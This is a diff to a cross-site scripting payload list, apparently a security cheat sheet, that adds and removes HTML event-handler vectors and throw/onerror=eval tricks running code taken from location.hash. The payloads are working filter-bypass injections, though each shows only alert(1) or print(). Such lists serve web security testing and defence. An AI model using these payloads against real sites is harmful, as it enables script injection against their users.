@@ -26,6 +26,8 @@
 <isindex type=submit action=javascript:alert(1)>
 <svg><discard onbegin=alert(1)>
 <svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>
+<img src=validimage.png onloadstart=alert(1)>
+<input type=image onloadend=alert(1) src=validimage.png>
 <script>alert(document.domain)<\/script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
@@ -750,16 +752,6 @@ code
 <audio onloadeddata=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
 <video autoplay onloadedmetadata=alert(1)> <source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>
 <audio autoplay onloadedmetadata=alert(1)> <source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
-<img src=validimage.png onloadend=alert(1)>
-<picture><source srcset=\"validimage.png\"><img onloadend=alert(1)><\/picture>
-<image src=validimage.png onloadend=alert(1)>
-<picture><source srcset=\"validimage.png\"><image onloadend=alert(1)><\/picture>
-<input type=image onloadend=alert(1) src=validimage.png>
-<img src=validimage.png onloadstart=alert(1)>
-<picture><source srcset=\"validimage.png\"><img onloadstart=alert(1)><\/picture>
-<image src=validimage.png onloadstart=alert(1)>
-<picture><source srcset=\"validimage.png\"><image onloadstart=alert(1)><\/picture>
-<input type=image onloadstart=alert(1) src=validimage.png>
 <body onmessage=print()>
 <* onmousedown=\"alert(1)\" style=display:block>test<\/*>
 <* onmouseenter=\"alert(1)\" style=display:block>test<\/*>
@@ -1004,7 +996,12 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>{onerror=alert}throw 1<\/script>
 <script>throw onerror=alert,1<\/script>
 <script>throw onerror=eval,'=alert\\x281\\x29'<\/script>
+<script>throw onerror=eval,'alert\\x281\\x29'<\/script>
 <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'}<\/script>
+<script>throw onerror=eval,e=new Error,e.message='alert\\x281\\x29',e<\/script>
+<script>throw onerror=Uncaught=eval,e=new Error,e.message='\/*'+location.hash,!!window.InstallTrigger?e:e.message<\/script>
+<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message<\/script>
+<script>throw\/x\/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message<\/script>
 <script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}<\/script>
 <script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}<\/script>
 <script>location='javascript:alert\\x281\\x29'<\/script>
